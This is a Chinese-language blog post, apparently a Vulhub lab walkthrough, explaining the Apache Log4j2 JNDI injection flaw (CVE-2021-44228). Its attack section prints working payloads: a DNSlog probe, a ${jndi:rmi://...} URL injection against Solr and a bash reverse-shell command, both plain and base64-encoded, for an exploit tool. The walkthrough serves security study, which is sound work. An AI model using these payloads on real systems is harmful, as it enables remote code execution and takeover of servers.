@@ -1,0 +1,197 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Apache Log4j2远程代码执行漏洞 | xiaohu'blog</title><meta name="author" content="xiaohu"><meta name="copyright" content="xiaohu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="简介Apache Log4j2是一个基于java的日志记录工具，它通过配置文件中定义的规则来决定如何格式化和输出日志消息，该日志框架被大量用于业务系统开发log4j2是一个组件，在处理日志记录时存在JNDI注入缺陷，攻击者仅仅需要向目标服务器发送精心构造的恶意数据触发log4j2组件的解析缺陷，就可以实现目标服务器任意命令执行，获取目标服务器权限 影响版本Apache Log4j2 2.x &amp;lt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Log4j2远程代码执行漏洞">
+<meta property="og:url" content="http://xiaohu430.top/2023/08/08/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="xiaohu&#39;blog">
+<meta property="og:description" content="简介Apache Log4j2是一个基于java的日志记录工具，它通过配置文件中定义的规则来决定如何格式化和输出日志消息，该日志框架被大量用于业务系统开发log4j2是一个组件，在处理日志记录时存在JNDI注入缺陷，攻击者仅仅需要向目标服务器发送精心构造的恶意数据触发log4j2组件的解析缺陷，就可以实现目标服务器任意命令执行，获取目标服务器权限 影响版本Apache Log4j2 2.x &amp;lt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://xiaohu430.top/img/ApacheLog4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/0.webp">
+<meta property="article:published_time" content="2023-08-08T02:07:00.000Z">
+<meta property="article:modified_time" content="2023-08-08T02:32:21.718Z">
+<meta property="article:author" content="xiaohu">
+<meta property="article:tag" content="Vulhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://xiaohu430.top/img/ApacheLog4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/0.webp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://xiaohu430.top/2023/08/08/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Apache Log4j2远程代码执行漏洞',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-08-08 10:32:21'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/ApacheLog4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/0.webp')"><nav id="nav"><span id="blog-info"><a href="/" title="xiaohu'blog"><span class="site-name">xiaohu'blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Apache Log4j2远程代码执行漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-08T02:07:00.000Z" title="发表于 2023-08-08 10:07:00">2023-08-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-08T02:32:21.718Z" title="更新于 2023-08-08 10:32:21">2023-08-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Apache Log4j2远程代码执行漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Log4j2是一个基于java的日志记录工具，它通过配置文件中定义的规则来决定如何格式化和输出日志消息，该日志框架被大量用于业务系统开发<br>log4j2是一个组件，在处理日志记录时存在JNDI注入缺陷，攻击者仅仅需要向目标服务器发送精心构造的恶意数据触发log4j2组件的解析缺陷，就可以实现目标服务器任意命令执行，获取目标服务器权限</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Log4j2 2.x &lt;&#x3D; 2.14.1<br>Apache Log4j2 2.15.0-rc1</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>MessagePatternConverter类的format()方法是Log4j2提供的一个模式转换器，用于将日志消息中的特定模式转换为实际内容，例如存在一个模式%d{date:yyyy-MM-dd}，它表示需要将当前日期按照指定的格式输出到日志中。在调用format()方法时，Log4j2会查找该模式，并使用当前日期的值替换它，然后将结果输出到日志中。（简单来说：log4j2的模式是以“%d{”开始，用于定义日志输出的格式和内容）</li>
+<li>在漏洞中，攻击者构造一个特殊的表达式，将其作为日志消息发给受影响的log4j2应用程序，当MessagePatternConverter的format()方法检测到日志消息中包含“${”时，它会将表达式的内容解析并替换为解析后的内容，而不是保留表达式的本身</li>
+<li>举例说明，设有以下的日志配置文件： <PatternLayout pattern="%d{yyyy-MM-dd} [%t] %-5level %logger{1.} - %msg%n" />
+
+<pre><code>      在日志消息中，我们使用了 $&#123;user.home&#125; 表达式来引用用户的主目录路径，例如：
+      logger.info(&quot;User home directory: $&#123;user.home&#125;&quot;);
+
+     当Log4j2处理该日志消息时，它会检测到 $&#123;user.home&#125; 这个表达式，并调用相关的机制来解析它。在这种情况下，Log4j2会获取当前用户的主目录路径，并将其替换掉 $&#123;user.home&#125;：
+      2022-01-05 [main] INFO  com.example.MyClass - User home directory: /Users/username
+      意味着 Log4j2 的 MessagePatternConverter 在处理日志消息时不仅仅是保留表达式本身，而是将表达式解析并替换为相应的内容。
+</code></pre>
+</li>
+<li>恶意的 payload：攻击者构造一个包含恶意的 JNDI 注入代码的 Payload ，并将其作为日志消息的一部分传递给 Log4j。</li>
+<li>占位符解析：Log4j 使用 format() 方法处理日志消息，尝试解析其中的占位符，${jndi:ldap:&#x2F;&#x2F;my-ip&#x2F;exp} 被视为一个占位</li>
+<li>递归解析问题：在解析占位符时，Log4j 存在递归解析的问题，它会尝试执行其中包含的 JNDI注入代码</li>
+<li>JNDI lookup 操作：具体而言，Log4j 在解析阶段会尝试使用 JNDI API 进行 lookup 操作，以获取与指定的JNDI URL 相关联的资源</li>
+<li>恶意的 JNDI URL：JNDI UR <strong>${jndi:ldap:&#x2F;&#x2F;my-ip&#x2F;exp}</strong> 中的 <strong>ldap:&#x2F;&#x2F;my-ip&#x2F;exp</strong> 部分是由攻击者控制的，用于指向远程资源或恶意代码</li>
+<li>远程代码执行：当 Log4j 尝试执行  JNDI lookup 操作时，它会通过 IDAP 协议连接到 my-ip 地址，并尝试获取相关资源，如果攻击成功，该地址会返回包含可执行 java 代码的 .class 文件的 URL<br><strong>（综上，通过在受影响的 Log4j 日志文件中注入恶意的 JNDI 注入代码，攻击者能够利用递归解析问题和 JNDI Lookup 操作，导致 Log4j 下载并执行远程服务器上恶意的 .class 文件，从而实现远程代码执行）</strong></li>
+</ul>
+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>使用vulhub&#x2F;log4j2&#x2F;CVE-2021-44228</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d        <span class="comment">#启动环境</span></span><br></pre></td></tr></table></figure>
+<p> 访问URL：<a target="_blank" rel="noopener" href="http://your-ip:8983/">http://your-ip:8983</a><br><img src="/img/ApacheLog4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.jpg"><br>在dnslog中生成接收信息的域名<br><img src="/img/ApacheLog4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.jpg"><br>提交 dns payload 参数进行访问</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.16.106:8983/solr/admin/cores?action=<span class="variable">$&#123;jndi:ldap://0wxnb0.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/img/ApacheLog4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.jpg"><br>可以发现到 dns 中能接收返回的信息<br><img src="/img/ApacheLog4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.jpg"></p>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>使用工具JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar  （下载地址<a target="_blank" rel="noopener" href="https://github.com/bkfish/Apache-Log4j-Learning/%EF%BC%8C%E5%9C%A8tools%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%89">https://github.com/bkfish/Apache-Log4j-Learning/，在tools目录下）</a><br>payload：（需要进行bash64加密）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-C <span class="string">&quot;bash -c &#123;echo,bash -i &gt;&amp; /dev/tcp/10.211.55.5/6969 0&gt;&amp;1&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A 10.211.55.5</span><br><span class="line">-C <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMTEuNTUuNS82OTY5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A 10.211.55.5</span><br></pre></td></tr></table></figure>
+<p><img src="/img/ApacheLog4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/5.jpg"><br>如上图所示，生成了两种协议的payload参数，得到rmi，ldap参数<br>开启监听：<br><img src="/img/ApacheLog4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/6.jpg"><br> 将payload拼接到url中：<br> 提交 dns payload 参数进行访问</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.16.106:8983/solr/admin/cores?action=<span class="variable">$&#123;jndi:rmi://10.211.55.5:1099/z1h0et&#125;</span>  </span><br></pre></td></tr></table></figure>
+<p>成功监听<br><img src="/img/ApacheLog4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/7.jpg"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://xiaohu430.top">xiaohu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://xiaohu430.top/2023/08/08/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">http://xiaohu430.top/2023/08/08/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://xiaohu430.top" target="_blank">xiaohu'blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Vulhub/">Vulhub</a></div><div class="post_share"><div class="social-share" data-image="/img/ApacheLog4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/0.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/06/09/%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB/" title="常见渗透测试题目"><img class="cover" src="/img/%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB/0.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">常见渗透测试题目</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">xiaohu</div><div class="author-info__description">要跟过去的自己比，要期待未来的自己，珍爱现在的自己。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎访问我的网站！最近更新了新的内容，快来看看吧！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">4.</span> <span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">攻击</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/08/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="Apache Log4j2远程代码执行漏洞"><img src="/img/ApacheLog4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/0.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Apache Log4j2远程代码执行漏洞"/></a><div class="content"><a class="title" href="/2023/08/08/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="Apache Log4j2远程代码执行漏洞">Apache Log4j2远程代码执行漏洞</a><time datetime="2023-08-08T02:07:00.000Z" title="发表于 2023-08-08 10:07:00">2023-08-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/09/%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB/" title="常见渗透测试题目"><img src="/img/%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB/0.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="常见渗透测试题目"/></a><div class="content"><a class="title" href="/2023/06/09/%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB/" title="常见渗透测试题目">常见渗透测试题目</a><time datetime="2023-06-09T00:52:45.000Z" title="发表于 2023-06-09 08:52:45">2023-06-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/08/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA02/" title="红日靶场02"><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA02/0.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场02"/></a><div class="content"><a class="title" href="/2023/06/08/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA02/" title="红日靶场02">红日靶场02</a><time datetime="2023-06-08T02:00:00.000Z" title="发表于 2023-06-08 10:00:00">2023-06-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%95%86%E5%9F%8E%E6%9C%8D%E5%8A%A11%E5%88%86%E9%92%B1%E8%B4%AD%E7%89%A9%E6%BC%8F%E6%B4%9E/" title="记一次公众号商城服务1分钱购物漏洞"><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%95%86%E5%9F%8E%E6%9C%8D%E5%8A%A11%E5%88%86%E9%92%B1%E8%B4%AD%E7%89%A9%E6%BC%8F%E6%B4%9E/0.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次公众号商城服务1分钱购物漏洞"/></a><div class="content"><a class="title" href="/2023/05/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%95%86%E5%9F%8E%E6%9C%8D%E5%8A%A11%E5%88%86%E9%92%B1%E8%B4%AD%E7%89%A9%E6%BC%8F%E6%B4%9E/" title="记一次公众号商城服务1分钱购物漏洞">记一次公众号商城服务1分钱购物漏洞</a><time datetime="2023-05-29T05:45:38.000Z" title="发表于 2023-05-29 13:45:38">2023-05-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/29/%E6%8E%A2%E7%A9%B6%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A5%E5%8F%A3%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%8F%A3%E5%88%B0%E6%97%81%E7%AB%99getshell/" title="探究公众号接口漏洞：从后台登录口到旁站getshell"><img src="/img/%E6%8E%A2%E7%A9%B6%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A5%E5%8F%A3%E6%BC%8F%E6%B4%9E_%E4%BB%8E%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%8F%A3%E5%88%B0%E6%97%81%E7%AB%99getshell/0.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="探究公众号接口漏洞：从后台登录口到旁站getshell"/></a><div class="content"><a class="title" href="/2023/05/29/%E6%8E%A2%E7%A9%B6%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A5%E5%8F%A3%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%8F%A3%E5%88%B0%E6%97%81%E7%AB%99getshell/" title="探究公众号接口漏洞：从后台登录口到旁站getshell">探究公众号接口漏洞：从后台登录口到旁站getshell</a><time datetime="2023-05-29T05:34:35.000Z" title="发表于 2023-05-29 13:34:35">2023-05-29</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/ApacheLog4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/0.webp')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By xiaohu</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
